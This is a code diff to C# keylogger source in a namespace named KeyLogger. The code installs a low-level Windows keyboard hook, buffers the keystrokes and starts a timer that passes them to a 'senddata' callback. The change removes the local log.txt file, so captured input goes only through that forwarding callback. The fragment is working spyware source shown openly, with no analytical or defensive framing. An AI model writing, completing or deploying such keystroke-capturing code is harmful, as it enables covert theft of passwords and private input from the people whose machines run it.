@@ -33,13 +33,12 @@ namespace KeyLogger {
         public static string buf = "";
         private static Action<string> senddata;
         private const int WH_KEYBOARD_LL = 13;
-        private const int WM_KEYDOWN = 0x0100;private const string logFileName = "log.txt";
-        private static StreamWriter logFile;private static HookProc hookProc = HookCallback;
+        private const int WM_KEYDOWN = 0x0100;
+        private static HookProc hookProc = HookCallback;
         private static IntPtr hookId = IntPtr.Zero;
         private static System.Threading.Timer stateTimer;
         public static void Run(Action<string> func) {
-        logFile = File.AppendText(logFileName);
-        logFile.AutoFlush = true;
+
         senddata = func;
         hookId = SetHook(hookProc);
         TimerStart();
